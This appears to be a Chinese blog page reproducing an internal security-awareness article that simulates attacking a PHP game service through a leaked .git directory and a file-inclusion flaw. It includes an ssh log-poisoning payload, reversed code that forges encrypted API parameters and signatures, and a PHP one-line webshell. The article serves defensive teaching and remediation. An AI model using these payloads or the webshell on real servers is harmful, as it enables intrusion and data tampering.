<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>一次 .git 泄漏引发的 “血案” - callous' blog</title><meta name=keywords content="tech"><meta name=description content="这是一篇发表在公司内部月刊的安全文章，意在提升开发部门的安全意识，所以概念解释颇多
 上周，在日常漏洞扫描工作中，发现某游戏部门的 web 服务存在 .git 代码泄漏问题，并且发现服务代码存在严重的文件包含漏洞。
扫描到这一问题后，我们第一时间确认了该系列安全问题尚未被攻击者利用（日志），之后第一时间重命名了 .git 目录。 “血案” 并未真实发生，下面只是模拟了在不知道服务器任何信息的情况下，利用各种暴露的风险因素，制造一起 “血案”。
整体事件过程：
1. .git 代码泄漏
2. 代码审计
 发现文件包含漏洞 大量的内部接口及数据库账户密码 可直接对多个游戏的账户增加积分、金币等  3. 漏洞利用
 利用其接口测试代码顺利执行恶意代码  4. 服务器权限
 阿里云内网服务  从最终结果来看，如果攻击发生，可能导致十分严重的后果：接口泄漏、各种环境密码泄漏、内网其他服务器可能被入侵、线上数据被修改等
此次展示过程到服务器权限这就结束了，但如果是真实攻击者进行持续渗透，内网服务器及整个业务线都有可能被攻击勒索，造成重大事故。
本次案例也从技术细节上发现了诸多安全问题，如不严谨的函数处理、将正式环境等信息加入版本控制等
攻击过程模拟 取得源码 通过工具就能直接从泄露的 .git 地址中，还原出项目源码，如下图 信息收集 在 web 渗透测试之前，最重要的一步是信息收集，可以说渗透的本质其实也是信息收集
在项目的根目录中我发现了这个文件，接触过 php 的朋友应该都很熟悉，这可以给我们提供很多的服务器信息，详情可以参考官方手册 phpinfo 不过，这里有一点要说明的是，虽然我们看到了这个文件，但真实环境中不一定存在这个文件。原因就是我们得到的代码是通过 .git 目录还原过来的，是 git 中有提交记录的文件。如果开发者在正式环境中对某个文件进行了更改，并且没有进行提交，那么我们也不能通过 .git 目录还原出该文件的真实状态。所以不要把正式环境的信息加入到版本控制中，是很有道理的。
然而这里我还是访问到了这个文件（所以这个信息收集得来全不费功夫），下面是 phpinfo 页面中查看到的这个 web 服务的根目录 代码审计 到现在为止，我们已经拿到了服务源码（其中包含数据库等敏感信息）和收集了一些服务器信息。那么接下来再来看下能否 ”攻陷“ 这台服务器。既然拿到了代码，就从代码入手吧。
审计代码发现，在某个入口文件处，引入了一个获取数据的 php 文件，其通过获取 GET 请求中的 url 参数，从指定文件目录中获取数据来渲染页面。"><meta name=author content="callous"><link rel=canonical href=https://callous.cn/blog/tech/php/><link href=https://callous.cn/assets/css/stylesheet.min.595f5ecef354f9eb94e43d831cd360dcf8b7727542e731c55a7875c9e94a9577.css integrity="sha256-WV9ezvNU+euU5D2DHNNg3Pi3cnVC5zHFWnh1yelKlXc=" rel="preload stylesheet" as=style><link rel=manifest href=https://callous.cn/site.webmanifest><link rel=icon href=https://callous.cn/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://callous.cn/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://callous.cn/favicon-32x32.png><link rel=apple-touch-icon href=https://callous.cn/apple-touch-icon.png><link rel=mask-icon href=https://callous.cn/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.78.1"><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','G-2C1K8EY548','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');ga('create','G-2C1K8EY548','auto');ga('send','pageview');}</script><meta property="og:title" content="一次 .git 泄漏引发的 “血案”"><meta property="og:description" content="这是一篇发表在公司内部月刊的安全文章，意在提升开发部门的安全意识，所以概念解释颇多
 上周，在日常漏洞扫描工作中，发现某游戏部门的 web 服务存在 .git 代码泄漏问题，并且发现服务代码存在严重的文件包含漏洞。
扫描到这一问题后，我们第一时间确认了该系列安全问题尚未被攻击者利用（日志），之后第一时间重命名了 .git 目录。 “血案” 并未真实发生，下面只是模拟了在不知道服务器任何信息的情况下，利用各种暴露的风险因素，制造一起 “血案”。
整体事件过程：
1. .git 代码泄漏
2. 代码审计
 发现文件包含漏洞 大量的内部接口及数据库账户密码 可直接对多个游戏的账户增加积分、金币等  3. 漏洞利用
 利用其接口测试代码顺利执行恶意代码  4. 服务器权限
 阿里云内网服务  从最终结果来看，如果攻击发生，可能导致十分严重的后果：接口泄漏、各种环境密码泄漏、内网其他服务器可能被入侵、线上数据被修改等
此次展示过程到服务器权限这就结束了，但如果是真实攻击者进行持续渗透，内网服务器及整个业务线都有可能被攻击勒索，造成重大事故。
本次案例也从技术细节上发现了诸多安全问题，如不严谨的函数处理、将正式环境等信息加入版本控制等
攻击过程模拟 取得源码 通过工具就能直接从泄露的 .git 地址中，还原出项目源码，如下图 信息收集 在 web 渗透测试之前，最重要的一步是信息收集，可以说渗透的本质其实也是信息收集
在项目的根目录中我发现了这个文件，接触过 php 的朋友应该都很熟悉，这可以给我们提供很多的服务器信息，详情可以参考官方手册 phpinfo 不过，这里有一点要说明的是，虽然我们看到了这个文件，但真实环境中不一定存在这个文件。原因就是我们得到的代码是通过 .git 目录还原过来的，是 git 中有提交记录的文件。如果开发者在正式环境中对某个文件进行了更改，并且没有进行提交，那么我们也不能通过 .git 目录还原出该文件的真实状态。所以不要把正式环境的信息加入到版本控制中，是很有道理的。
然而这里我还是访问到了这个文件（所以这个信息收集得来全不费功夫），下面是 phpinfo 页面中查看到的这个 web 服务的根目录 代码审计 到现在为止，我们已经拿到了服务源码（其中包含数据库等敏感信息）和收集了一些服务器信息。那么接下来再来看下能否 ”攻陷“ 这台服务器。既然拿到了代码，就从代码入手吧。
审计代码发现，在某个入口文件处，引入了一个获取数据的 php 文件，其通过获取 GET 请求中的 url 参数，从指定文件目录中获取数据来渲染页面。"><meta property="og:type" content="article"><meta property="og:url" content="https://callous.cn/blog/tech/php/"><meta property="article:published_time" content="2021-08-31T18:00:00+08:00"><meta property="article:modified_time" content="2021-08-31T18:00:00+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="一次 .git 泄漏引发的 “血案”"><meta name=twitter:description content="这是一篇发表在公司内部月刊的安全文章，意在提升开发部门的安全意识，所以概念解释颇多
 上周，在日常漏洞扫描工作中，发现某游戏部门的 web 服务存在 .git 代码泄漏问题，并且发现服务代码存在严重的文件包含漏洞。
扫描到这一问题后，我们第一时间确认了该系列安全问题尚未被攻击者利用（日志），之后第一时间重命名了 .git 目录。 “血案” 并未真实发生，下面只是模拟了在不知道服务器任何信息的情况下，利用各种暴露的风险因素，制造一起 “血案”。
整体事件过程：
1. .git 代码泄漏
2. 代码审计
 发现文件包含漏洞 大量的内部接口及数据库账户密码 可直接对多个游戏的账户增加积分、金币等  3. 漏洞利用
 利用其接口测试代码顺利执行恶意代码  4. 服务器权限
 阿里云内网服务  从最终结果来看，如果攻击发生，可能导致十分严重的后果：接口泄漏、各种环境密码泄漏、内网其他服务器可能被入侵、线上数据被修改等
此次展示过程到服务器权限这就结束了，但如果是真实攻击者进行持续渗透，内网服务器及整个业务线都有可能被攻击勒索，造成重大事故。
本次案例也从技术细节上发现了诸多安全问题，如不严谨的函数处理、将正式环境等信息加入版本控制等
攻击过程模拟 取得源码 通过工具就能直接从泄露的 .git 地址中，还原出项目源码，如下图 信息收集 在 web 渗透测试之前，最重要的一步是信息收集，可以说渗透的本质其实也是信息收集
在项目的根目录中我发现了这个文件，接触过 php 的朋友应该都很熟悉，这可以给我们提供很多的服务器信息，详情可以参考官方手册 phpinfo 不过，这里有一点要说明的是，虽然我们看到了这个文件，但真实环境中不一定存在这个文件。原因就是我们得到的代码是通过 .git 目录还原过来的，是 git 中有提交记录的文件。如果开发者在正式环境中对某个文件进行了更改，并且没有进行提交，那么我们也不能通过 .git 目录还原出该文件的真实状态。所以不要把正式环境的信息加入到版本控制中，是很有道理的。
然而这里我还是访问到了这个文件（所以这个信息收集得来全不费功夫），下面是 phpinfo 页面中查看到的这个 web 服务的根目录 代码审计 到现在为止，我们已经拿到了服务源码（其中包含数据库等敏感信息）和收集了一些服务器信息。那么接下来再来看下能否 ”攻陷“ 这台服务器。既然拿到了代码，就从代码入手吧。
审计代码发现，在某个入口文件处，引入了一个获取数据的 php 文件，其通过获取 GET 请求中的 url 参数，从指定文件目录中获取数据来渲染页面。"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"一次 .git 泄漏引发的 “血案”","name":"一次 .git 泄漏引发的 “血案”","description":"这是一篇发表在公司内部月刊的安全文章，意在提升开发部门的安全意识，所以概念解释颇多\n 上周，在日常漏洞扫描工作中，发现某游戏部门的 web 服务存在 .git 代码泄漏问题，并且发现服务代码存在严重的文件包含漏洞。\n扫描到这一问题后，我们第一时间确认了该系列安全问题尚未被攻击者利用（日志），之后第一时间重命名了 .git 目录。 “血案” 并未真实发生，下面 …","keywords":["tech"],"articleBody":" 这是一篇发表在公司内部月刊的安全文章，意在提升开发部门的安全意识，所以概念解释颇多\n 上周，在日常漏洞扫描工作中，发现某游戏部门的 web 服务存在 .git 代码泄漏问题，并且发现服务代码存在严重的文件包含漏洞。\n扫描到这一问题后，我们第一时间确认了该系列安全问题尚未被攻击者利用（日志），之后第一时间重命名了 .git 目录。 “血案” 并未真实发生，下面只是模拟了在不知道服务器任何信息的情况下，利用各种暴露的风险因素，制造一起 “血案”。\n整体事件过程：\n1. .git 代码泄漏\n2. 代码审计\n 发现文件包含漏洞 大量的内部接口及数据库账户密码 可直接对多个游戏的账户增加积分、金币等  3. 漏洞利用\n 利用其接口测试代码顺利执行恶意代码  4. 服务器权限\n 阿里云内网服务  从最终结果来看，如果攻击发生，可能导致十分严重的后果：接口泄漏、各种环境密码泄漏、内网其他服务器可能被入侵、线上数据被修改等\n此次展示过程到服务器权限这就结束了，但如果是真实攻击者进行持续渗透，内网服务器及整个业务线都有可能被攻击勒索，造成重大事故。\n本次案例也从技术细节上发现了诸多安全问题，如不严谨的函数处理、将正式环境等信息加入版本控制等\n攻击过程模拟 取得源码 通过工具就能直接从泄露的 .git 地址中，还原出项目源码，如下图 信息收集 在 web 渗透测试之前，最重要的一步是信息收集，可以说渗透的本质其实也是信息收集\n在项目的根目录中我发现了这个文件，接触过 php 的朋友应该都很熟悉，这可以给我们提供很多的服务器信息，详情可以参考官方手册 phpinfo 不过，这里有一点要说明的是，虽然我们看到了这个文件，但真实环境中不一定存在这个文件。原因就是我们得到的代码是通过 .git 目录还原过来的，是 git 中有提交记录的文件。如果开发者在正式环境中对某个文件进行了更改，并且没有进行提交，那么我们也不能通过 .git 目录还原出该文件的真实状态。所以不要把正式环境的信息加入到版本控制中，是很有道理的。\n然而这里我还是访问到了这个文件（所以这个信息收集得来全不费功夫），下面是 phpinfo 页面中查看到的这个 web 服务的根目录 代码审计 到现在为止，我们已经拿到了服务源码（其中包含数据库等敏感信息）和收集了一些服务器信息。那么接下来再来看下能否 ”攻陷“ 这台服务器。既然拿到了代码，就从代码入手吧。\n审计代码发现，在某个入口文件处，引入了一个获取数据的 php 文件，其通过获取 GET 请求中的 url 参数，从指定文件目录中获取数据来渲染页面。\n可以看到这里的 $path 是用户可以控制的输入\n继续追踪就来到了这里，traverse 函数对传入的 $path 目录进行遍历处理，如果遍历到文件就会传给 analysis 函数处理，然而 analysis 函数中却直接 require 了该文件。\n开发者的本意应该就是通过 require 一些 php 文件获得结果，返回给页面进行渲染，但不做限制的引入直接就形成了一个严重的 php 文件包含漏洞。\n 文件包含漏洞（File Inclusion）是一种常见的依赖于脚本运行从而影响 Web 应用的漏洞。严格来说，文件包含漏洞是“代码注入”的一种，许多脚本语言，例如 PHP、JSP、ASP、.NET 等，都提供了一种包含文件的功能，这种功能允许开发者将可使用的脚本代码插入到单个文件中保存，在需要调用的时候可以直接通过载入文件的方式执行里面的代码，但是如果攻击者控制了可执行代码的路径，也就是文件位置时，攻击者可以修改指定路径，将其指向一个包含了恶意代码的恶意文件\n 在 php 的引入机制中， require 或 include 语句会获取指定文件（可以是任意文件类型例如: jpg、txt、html 等），并将文件内容复制到使用执行引入语句的文件中。然后，再使用 php 脚本引擎去解释运行引入的文本内容，使得其中包含 php 标记的代码就会被执行，标记以外的数据会原样返回。\n漏洞验证 进一步查看代码后，我发现了一个测试接口的 php 文件 testAPI.php ，可以用来测试该项目中所有的接口，后面会通过这个文件来构造请求，这里我们先通过构造前面的 url 参数来验证下我们发现的漏洞，可以注意下这里的逻辑。\n通过我们知道的 web 根目录来构造 url 参数，根据代码逻辑，该目录下的文件都会被 require。\n可以看到，直接返回了 error ，那是因为我们没有传递 key 参数，但也侧面印证了 testAPI.php 文件中的代码被包含并执行了。\n漏洞利用 关于 php 包含漏洞的利用，网上有很多方法。例如，通过访问构造的网址让 nginx 产生包含恶意代码的日志文件或通过文件上传功能上传包含恶意代码的文件（如图片），然后利用漏洞包含这些文件。本质就是在目标服务器中生成一个包含 php 恶意代码的文件，并让程序包含执行。\n这篇文章比较详细地介绍了常见的本地文件包含漏洞利用方法：What is an LFI Vulnerability?\n这里只简单举一个利用 ssh 登陆写入恶意代码的例子。拿自己的服务器做个试验，我们构造一个包含恶意代码的 ssh 连接，将用户名替换成恶意代码，如下：\nssh ''@xxx.xxx.xxx.xxx 接着我们就可以在服务器中看到如下日志\n这时，如果我们控制程序包含 /var/log/secure 这个文件，那么我们的恶意代码就会被执行。\n然而，不幸的是，常用的方法在今天并不奏效。该服务器对外开放的端口很少，相关目录也设置了访问权限，导致常用的方法都不能成功利用。\n但是，攻击者是不会这么轻易放弃的。既然外部写入不行，那能不能通过程序本身来写入一些包含恶意脚本的文件呢？\n经过搜索，在项目目录中发现了一个日志文件夹，并找到了写入该日志的代码位置，应该是用于记录接口的请求日志。\n这里也许也可以被利用，因为我们可以推断日志最终生成的位置，查看 log_helper 内代码后发现日志生成的文件夹就是当前时间对应的文件夹。\n但是前提是我们得构造一个看似合理的正常请求。这里我利用上面提到的那个测试接口的 php 文件进行请求，接口所需的参数大致如下：\n这里的 appid，service，version 参数都能在代码中找到，token 可以是一个随机 32 位字符串，caller 可以指定任意的字符串，而 args 和 signature 需要通过计算得到。所有参数里，除了 caller 和 args 可以用来构造恶意代码外，其他参数都会被服务进行强校验（如不允许访问不存在的 service）。但是 caller 参数不会被记录到我们上面所说的日志文件中，所以我们只能利用 args 来构造请求。\n上面说到 args 和 signature 需要通过计算得到，signature 参数是请求的签名，通过阅读代码可以确定，是将 signature 去除后，对所有参数按照键值升序排序，再加上 secret_key 进行 md5 运算。\nprivate function _check_base($input) { $appid = service_config::get_appid($this-_appid); $input = util::urlencode($input); unset($input['signature']);//注消Signature参数 \tksort($input);//对POST的Key 数据进行sort排序 \t$str = ''; foreach ($input as $key=$val){ $str .= $key.'='.$val.'|';//等号连接每个值 \t} $str .= $appid['secret_key']; $input_md5 = md5($str); if ($input_md5 != $this-_signature) { $this-_error('请求签名校验错误--', 11301); } //view::set('aaaa', self::encode(array('areaid'=1056, 'appkey'='NG_365', 'type'=1, 'rkey'='dress'), $appid['secret_key'])); \t} 接下来看 args ，相比签名的运算，这个相对复杂一些，需要考验逆向思维。首先这个 args 是一个加密参数，但项目中只有解密过程的代码，我们要据此推算出该参数的加密方法，解密方法代码如下：\nprivate function _decode_input($input) { $appid = service_config::get_appid($this-_appid); $x = 0; $key = $appid['secret_key']; $input = base64_decode(str_replace(' ', '+', (string)$input)); $len = strlen($input); $l = strlen($key); for ($i = 0; $i  $len; ++$i) { if ($x == $l) $x=0; $char .=substr($key,$x,1); ++$x; } for ($i = 0; $i  $len; ++$i) { if (ord(substr($input, $i, 1))  ord(substr($char, $i, 1))) { $str .=chr((ord(substr($input, $i, 1)) + 256) - ord(substr($char, $i, 1))); } else { $str .=chr(ord(substr($input, $i, 1)) - ord(substr($char, $i, 1))); } } $this-_args = util::json_decode($str); if ( ! is_array($this-_args)) { $this-_error('参数解析失败', 11401); } } 乍一看，令人头疼，其实还好。首先，加密的最终值是一个 base64 的编码值，并且解密最终得到一个 php 的数组。\n接着看解密过程，首先对加密数据进行 base64 编码，然后第一个 for 循环生成一个 $char 变量，看上去很复杂，其实就是生成了一个用 secret_key 填充的和 base64 解码后数据等长的字符串。（如 secret_key 为 abcdef，base64 解码后数据长度为 8，则 $char 就是 abcdefab）\n再看第二个 for ，这里对 $char 和解码后数据 $input 进行了逐位 ascii 码值比较。\n当 $input 位的 ascii 码值小于 $char 位的 ascii 码值时：\n解密后的 ascii 码值 = $input 位的 ascii 码值 + 256 - $char 位的 ascii 码值\n否则：\n解密后的 ascii 码值 = $input 位的 ascii 码值 - $char 位的 ascii 码值\n如果单看后面的情况，那么：\n加密的 ascii 码值 = 加密前数据位的 ascii 码值 + $char 位的 ascii 码值\n那么什么时候需要减去 256 呢（第一种情况）？\n这里应该是一个异常处理，当相加值大于 256 时则减去 256。不过，可见字符的 ascii 码最大就是 127 所以其实加不加这个判断都无所谓。\n综上，我们可以写出对应的 args 加密代码：\nphp $final = array(\"type\" = \"zhangboyi\"); $key = \"xxxxxxxxxxxx\"; $char = \"\"; $x = 0; $l = strlen($key); $l1 = json_encode($final); for ($i = 0; $i  strlen($l1); ++$i) { if ($x == $l) $x = 0; $char .= substr($key, $x, 1); ++$x; } $crypto = \"\"; for ($i = 0; $i  strlen($l1); ++$i) { $c = ord(substr($l1,$i,1)) + ord(substr($char,$i,1)); if ($c  256) { $c = $c -256; } $crypto .= chr($c); } echo base64_encode($crypto); 就是对解密代码的完全逆向，首先输入一个 php 数组，然后得到 $char ，接着进行 ascii 码运算，最后 base64 加密。\n回到这张图\n这里我们构造请求 service 为 Area.List.Get 的接口，并且 args 中指定了 type 参数为 zhangboyi 。\n提交成功！\n接着我们构造包含日志目录的 url ，并在其中搜索该次请求\n可以看到已经成功写入了。\n现在，让我们将上面的 type 参数改成恶意代码，我们将加密代码中的 $final 变量改成如下：\n$final = array(\"type\" = \"\\$_POST['y38hse']);?\"); 重新生成 args 和 sign 后，再次提交，依旧提交成功。\n至此，我们再访问刚才的网址，恶意代码  将会被执行。这是一个经典的 php 一句话木马，从 POST 请求里获取 y38hse 这个参数，并将参数内容当做 php 代码执行，让我们来验证一下。\n可以看到，代码被成功执行并返回了。\n现在，通过工具连接包含我们恶意代码的地址，就可以访问服务器里的所有资源\n到这里，攻击展示就结束了。但如果是真实攻击，攻击者很可能进行持续渗透，把影响延伸到整个服务内网。\n漏洞修复  删除泄露的 .git 目录 修复文件包含漏洞，可以进行目录限制或文件类型判断  事件总结   本次攻击模拟由 .git 泄露起，这是一个值得关注的问题，我们公司之前也有基于 git 实现部署的项目，这里很有可能造成 .git 目录的泄露。另外，除了 git 以外，其他信息的泄露也会造成安全隐患，如 svn 等。开发部门应该严格处理该类问题，对暴露的敏感信息进行及时删除或进行权限隔离。\n  代码的不严谨最终导致文件包含漏洞的产生，开发部门可以建立小组代码 review 机制，加强代码审查工作。\n  ","wordCount":"591","inLanguage":"en","datePublished":"2021-08-31T18:00:00+08:00","dateModified":"2021-08-31T18:00:00+08:00","author":{"@type":"Person","name":"callous"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://callous.cn/blog/tech/php/"},"publisher":{"@type":"Organization","name":"callous' blog","logo":{"@type":"ImageObject","url":"https://callous.cn/favicon.ico"}}}</script></head><body class=single id=top><script>if(localStorage.getItem("pref-theme")==="dark"){document.body.classList.add('dark');}else if(localStorage.getItem("pref-theme")==="light"){document.body.classList.remove('dark')}else if(window.matchMedia('(prefers-color-scheme: dark)').matches){document.body.classList.add('dark');}</script><noscript><style type=text/css>.theme-toggle,.top-link{display:none}</style></noscript><header class=header><nav class=nav><div class=logo><a href=https://callous.cn accesskey=h>callous' blog</a>
<span class=logo-switches><span class=theme-toggle><a id=theme-toggle accesskey=t><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></span></span></div><ul class=menu id=menu onscroll=menu_on_scroll()><li><a href=https://callous.cn/archives/><span>Archives</span></a></li><li><a href=https://callous.cn/tags/><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>一次 .git 泄漏引发的 “血案”</h1><div class=post-meta>August 31, 2021&nbsp;·&nbsp;3 min&nbsp;·&nbsp;callous</div></header><div class=post-content><blockquote><p>这是一篇发表在公司内部月刊的安全文章，意在提升开发部门的安全意识，所以概念解释颇多</p></blockquote><p>上周，在日常漏洞扫描工作中，发现某游戏部门的 <code>web</code> 服务存在 <code>.git</code> 代码泄漏问题，并且发现服务代码存在严重的文件包含漏洞。</p><p>扫描到这一问题后，我们第一时间确认了该系列安全问题尚未被攻击者利用（日志），之后第一时间重命名了 <code>.git</code> 目录。 “血案” 并未真实发生，下面只是模拟了在不知道服务器任何信息的情况下，利用各种暴露的风险因素，制造一起 “血案”。</p><p>整体事件过程：</p><p>1. <code>.git</code> 代码泄漏</p><p>2. 代码审计</p><ul><li>发现文件包含漏洞</li><li>大量的内部接口及数据库账户密码</li><li>可直接对多个游戏的账户增加积分、金币等</li></ul><p>3. 漏洞利用</p><ul><li>利用其接口测试代码顺利执行恶意代码</li></ul><p>4. 服务器权限</p><ul><li>阿里云内网服务</li></ul><p>从最终结果来看，如果攻击发生，可能导致十分严重的后果：接口泄漏、各种环境密码泄漏、内网其他服务器可能被入侵、线上数据被修改等</p><p>此次展示过程到服务器权限这就结束了，但如果是真实攻击者进行持续渗透，内网服务器及整个业务线都有可能被攻击勒索，造成重大事故。</p><p>本次案例也从技术细节上发现了诸多安全问题，如不严谨的函数处理、将正式环境等信息加入版本控制等</p><h1 id=攻击过程模拟>攻击过程模拟</h1><h2 id=取得源码>取得源码</h2><p>通过工具就能直接从泄露的 <code>.git </code>地址中，还原出项目源码，如下图
<img src=../../../tech/php/1.png alt=图1></p><h2 id=信息收集>信息收集</h2><p>在 <code>web</code> 渗透测试之前，最重要的一步是信息收集，可以说渗透的本质其实也是信息收集</p><p>在项目的根目录中我发现了这个文件，接触过 <code>php</code> 的朋友应该都很熟悉，这可以给我们提供很多的服务器信息，详情可以参考官方手册 <a href=https://www.php.net/manual/zh/function.phpinfo.php>phpinfo</a>
<img src=../../../tech/php/2.png alt=图2></p><p>不过，这里有一点要说明的是，虽然我们看到了这个文件，但真实环境中不一定存在这个文件。原因就是我们得到的代码是通过 <code>.git</code> 目录还原过来的，是 <code>git</code> 中有提交记录的文件。如果开发者在正式环境中对某个文件进行了更改，并且没有进行提交，那么我们也不能通过 <code>.git</code> 目录还原出该文件的真实状态。所以不要把正式环境的信息加入到版本控制中，是很有道理的。</p><p>然而这里我还是访问到了这个文件（所以这个信息收集得来全不费功夫），下面是 <code>phpinfo</code> 页面中查看到的这个 <code>web</code> 服务的根目录
<img src=../../../tech/php/3.png alt=图3></p><h2 id=代码审计>代码审计</h2><p>到现在为止，我们已经拿到了服务源码（其中包含数据库等敏感信息）和收集了一些服务器信息。那么接下来再来看下能否 ”攻陷“ 这台服务器。既然拿到了代码，就从代码入手吧。</p><p>审计代码发现，在某个入口文件处，引入了一个获取数据的 <code>php</code> 文件，其通过获取 <code>GET</code> 请求中的 <code>url</code> 参数，从指定文件目录中获取数据来渲染页面。</p><p><img src=../../../tech/php/4.png alt=图4></p><p>可以看到这里的 <code>$path</code> 是用户可以控制的输入</p><p><img src=../../../tech/php/5.png alt=图5></p><p>继续追踪就来到了这里，<code>traverse</code> 函数对传入的 <code>$path</code> 目录进行遍历处理，如果遍历到文件就会传给 <code>analysis</code> 函数处理，然而 <code>analysis</code> 函数中却直接 <code>require</code> 了该文件。</p><p><img src=../../../tech/php/6.png alt=图6></p><p>开发者的本意应该就是通过 <code>require</code> 一些 <code>php</code> 文件获得结果，返回给页面进行渲染，但不做限制的引入直接就形成了一个严重的 <code>php</code> <strong>文件包含漏洞</strong>。</p><blockquote><p>文件包含漏洞（File Inclusion）是一种常见的依赖于脚本运行从而影响 Web 应用的漏洞。严格来说，文件包含漏洞是“代码注入”的一种，许多脚本语言，例如 PHP、JSP、ASP、.NET 等，都提供了一种包含文件的功能，这种功能允许开发者将可使用的脚本代码插入到单个文件中保存，在需要调用的时候可以直接通过载入文件的方式执行里面的代码，但是如果攻击者控制了可执行代码的路径，也就是文件位置时，攻击者可以修改指定路径，将其指向一个包含了恶意代码的恶意文件</p></blockquote><p>在 <code>php</code> 的引入机制中， <code>require</code> 或 <code>include</code> 语句会获取指定文件（可以是任意文件类型例如: jpg、txt、html 等），并将文件内容复制到使用执行引入语句的文件中。然后，再使用 <code>php</code> 脚本引擎去解释运行引入的文本内容，使得其中包含 <code>php</code> 标记的代码就会被执行，标记以外的数据会原样返回。</p><h2 id=漏洞验证>漏洞验证</h2><p>进一步查看代码后，我发现了一个测试接口的 <code>php</code> 文件 <code>testAPI.php</code> ，可以用来测试该项目中所有的接口，后面会通过这个文件来构造请求，这里我们先通过构造前面的 <code>url</code> 参数来验证下我们发现的漏洞，可以注意下这里的逻辑。</p><p><img src=../../../tech/php/7.png alt=图7></p><p>通过我们知道的 <code>web</code> 根目录来构造 <code>url</code> 参数，根据代码逻辑，该目录下的文件都会被 <code>require</code>。</p><p><img src=../../../tech/php/8.png alt=图8></p><p>可以看到，直接返回了 <code>error</code> ，那是因为我们没有传递 <code>key</code> 参数，但也侧面印证了 <code>testAPI.php</code> 文件中的代码被包含并执行了。</p><h2 id=漏洞利用>漏洞利用</h2><p>关于 <code>php</code> 包含漏洞的利用，网上有很多方法。例如，通过访问构造的网址让 <code>nginx</code> 产生包含恶意代码的日志文件或通过文件上传功能上传包含恶意代码的文件（如图片），然后利用漏洞包含这些文件。本质就是在目标服务器中生成一个包含 <code>php</code> 恶意代码的文件，并让程序包含执行。</p><p>这篇文章比较详细地介绍了常见的本地文件包含漏洞利用方法：<a href=https://highon.coffee/blog/lfi-cheat-sheet/>What is an LFI Vulnerability?</a></p><p>这里只简单举一个利用 <code>ssh</code> 登陆写入恶意代码的例子。拿自己的服务器做个试验，我们构造一个包含恶意代码的 <code>ssh</code> 连接，将用户名替换成恶意代码，如下：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ssh <span style=color:#e6db74>&#39;&lt;?php phpinfo(); ?&gt;&#39;</span>@xxx.xxx.xxx.xxx
</code></pre></div><p>接着我们就可以在服务器中看到如下日志</p><p><img src=../../../tech/php/9.png alt=图9></p><p>这时，如果我们控制程序包含 <code>/var/log/secure</code> 这个文件，那么我们的恶意代码就会被执行。</p><p>然而，不幸的是，常用的方法在今天并不奏效。该服务器对外开放的端口很少，相关目录也设置了访问权限，导致常用的方法都不能成功利用。</p><p>但是，攻击者是不会这么轻易放弃的。既然外部写入不行，那能不能通过程序本身来写入一些包含恶意脚本的文件呢？</p><p>经过搜索，在项目目录中发现了一个日志文件夹，并找到了写入该日志的代码位置，应该是用于记录接口的请求日志。</p><p><img src=../../../tech/php/10.png alt=图10></p><p>这里也许也可以被利用，因为我们可以推断日志最终生成的位置，查看 <code>log_helper</code> 内代码后发现日志生成的文件夹就是当前时间对应的文件夹。</p><p>但是前提是我们得构造一个看似合理的正常请求。这里我利用上面提到的那个测试接口的 <code>php</code> 文件进行请求，接口所需的参数大致如下：</p><p><img src=../../../tech/php/11.png alt=图11></p><p>这里的 <code>appid</code>，<code>service</code>，<code>version</code> 参数都能在代码中找到，<code>token</code> 可以是一个随机 32 位字符串，<code>caller</code> 可以指定任意的字符串，而 <code>args</code> 和 <code>signature</code> 需要通过计算得到。所有参数里，除了 <code>caller</code> 和 <code>args</code> 可以用来构造恶意代码外，其他参数都会被服务进行强校验（如不允许访问不存在的 <code>service</code>）。但是 <code>caller</code> 参数不会被记录到我们上面所说的日志文件中，所以我们只能利用 <code>args</code> 来构造请求。</p><p>上面说到 <code>args</code> 和 <code>signature</code> 需要通过计算得到，<code>signature</code> 参数是请求的签名，通过阅读代码可以确定，是将 <code>signature</code> 去除后，对所有参数按照键值升序排序，再加上 <code>secret_key</code> 进行 <code>md5</code> 运算。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php>	<span style=color:#66d9ef>private</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>_check_base</span>($input) {
